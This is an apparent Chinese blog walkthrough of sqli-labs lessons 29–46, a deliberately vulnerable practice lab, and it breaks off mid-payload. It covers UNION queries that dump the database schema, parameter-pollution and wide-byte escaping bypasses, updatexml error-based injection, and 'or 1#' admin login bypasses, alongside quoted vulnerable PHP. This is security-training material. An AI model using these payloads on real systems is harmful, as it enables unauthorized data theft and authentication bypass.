class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220051754.png" alt="image-20210120220051754"></p><p>怀疑根本就没有任何防御</p><p>实际上，主角不是这个index.php</p><p>而是login.php</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220604740.png" alt="image-20210120220604740"></p><p>是关于java和tomcat的</p><p>试试看闭合，尝试?id&#x3D;1’结果是跳转到hacked.php页面，尝试id&#x3D;1’%23结果还是跳转到hacked.php页面，尝试?id&#x3D;1’)%23和?id&#x3D;1’))%23，都是一样的，跳转到hacked.php页面</p><p>没辙了，分析一波源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id1</span>=<span class="hljs-title function_ invoke__">java_implimentation</span>(<span class="hljs-variable">$qs</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;<br><span class="hljs-variable">$qs_array</span>= <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>&#123;<br><span class="hljs-variable">$val</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)<br>&#123;<br><span class="hljs-variable">$id_value</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见 $id1 的值是query_string中第一个名为id的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">whitelist</span>(<span class="hljs-variable">$id1</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>&#123;<br><span class="hljs-comment">//echo &quot;you are good&quot;;</span><br><span class="hljs-comment">//return $match;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br><span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见 $id1 只能全是数字，否则就会跳转到hacked.php</p><p>而最终参与sql语句的是 $id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>提示有两个pdf</p><p><a href="https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf">https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf</a></p><p><a href="https://community.qualys.com/servlet/JiveServlet/download/38-10665/Protocol-Level%20Evasion%20of%20Web%20Application%20Firewalls%20v1.1%20(18%20July%202012).pdf">https://community.qualys.com/servlet/JiveServlet/download/38-10665/Protocol-Level%20Evasion%20of%20Web%20Application%20Firewalls%20v1.1%20(18%20July%202012).pdf</a></p><p>里面有需要的知识点</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222527706.png" alt="image-20210120222527706"></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222447856.png" alt="image-20210120222447856"></p><p>可见 对待多个相同名字的不同参数，不同的HTTP back-ends 有不同的处理方式</p><p>其中，php是取最后出现的那个为实际使用参数</p><p>所以，答案就显而易见了</p><p>使用超级payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223001087.png" alt="image-20210120223001087"></p><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>login.php才是主角</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223430630.png" alt="image-20210120223430630"></p><p>直接分析源码了</p><p>换汤不换药，这次是双引号</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&amp;id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223714110.png" alt="image-20210120223714110"></p><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>和 less-29、less-30一样，就是这次是 )”</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&amp;id=0&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223906769.png" alt="image-20210120223906769"></p><p>会被escape，而且推测id的类型为int</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224114512.png" alt="image-20210120224114512"></p><p>报错不会回显</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224307444.png" alt="image-20210120224307444"></p><p>那就只能试试宽字节了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=%df%27 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224418287.png" alt="image-20210120224418287"></p><p>接下来就是为所欲为了</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224738271.png" alt="image-20210120224738271"></p><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>还是会escape</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure><p>和上局一样</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225010194.png" alt="image-20210120225010194"></p><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225101790.png" alt="image-20210120225101790"></p><p>变成俩输入了</p><p>而且还是会escape</p><p> 会报错</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=%df%27 <span class="hljs-keyword">or</span> %23&amp;<span class="hljs-attribute">passwd</span>=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225502783.png" alt="image-20210120225502783"></p><p>所以可以报错注入了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=%df%<span class="hljs-number">27</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225634952.png" alt="image-20210120225634952"></p><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>还是会escape</p><p>闭合</p><p><code>?id=%df%27</code> 和 <code>?id=%df&quot;</code> 都报错，说明没有用到引号</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure><p>escape是唬人的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120230800220.png" alt="image-20210120230800220"></p><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>还是说有escape</p><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=%df%27 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure><p>报错不回显</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231310079.png" alt="image-20210120231310079"></p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>两个输入</p><p>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span>==%<span class="hljs-built_in">df</span><span class="hljs-string">&#x27;%23&amp;passwd=admin&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p>有报错回显</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>==%df&#x27; union select 1,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%23&amp;<span class="hljs-attribute">passwd</span>=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231921648.png" alt="image-20210120231921648"></p><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120232334394.png" alt="image-20210120232334394"></p><p>感觉没什么防护</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120234746825.png" alt="image-20210120234746825"></p><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure><p>没有引号</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121110723299.png" alt="image-20210121110723299"></p><h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121111041676.png" alt="image-20210121111041676"></p><h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112018887.png" alt="image-20210121112018887"></p><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>有两个输入</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112430298.png" alt="image-20210121112430298"></p><p>无论点击什么，好像都没啥用，这两个输入不知道有没有参与sql语句，试一试</p><p><code>login_user=admin&quot;</code> 和 <code>login_user=admin&#39;</code> 都没有什么报错，可能没有注入点，<code>login_password=admin&#39;</code> 就报错了，说明login_passwd可以是注入点</p><p>闭合</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=<span class="hljs-number">1</span>&amp;login_password=admin&#x27;%<span class="hljs-number">23</span>&amp;mysubmit=Login<br></code></pre></td></tr></table></figure><p>用报错注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=<span class="hljs-number">1</span>&amp;login_password=admin&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>&amp;mysubmit=Login<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112932139.png" alt="image-20210121112932139"></p><p>也可以这样登录admin</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27;or <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113359396.png" alt="image-20210121113359396"></p><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">login_user=<span class="hljs-literal">admin</span>&amp;login_password=<span class="hljs-literal">admin</span><span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>passwd 是注入点</p><p>登录admin账号</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">login_user=admin&amp;login_password=admin&#x27;) or 1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113902374.png" alt="image-20210121113902374"></p><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>没有报错，找不到注入点</p><p>看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><p>知道passwd是注入点</p><p>登录admin</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121125751221.png" alt="image-20210121125751221"></p><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>用引号靠报错，还是没法找到注入点</p><p>看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$username</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><p>登录admin</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">login_user=admin&amp;login_password=admin&#x27;)or 1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131558315.png" alt="image-20210121131558315"></p><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131650460.png" alt="image-20210121131650460"></p><p>有点变化，参数是sort</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=1<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131739030.png" alt="image-20210121131739030"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=2<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131823654.png" alt="image-20210121131823654"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=3<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131931952.png" alt="image-20210121131931952"></p><p>分别按id、username、password升序排列</p><p>可能是用到了order by </p><p>报错注入</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> AND updatexml(<span class="hljs-number">1</span>,<span 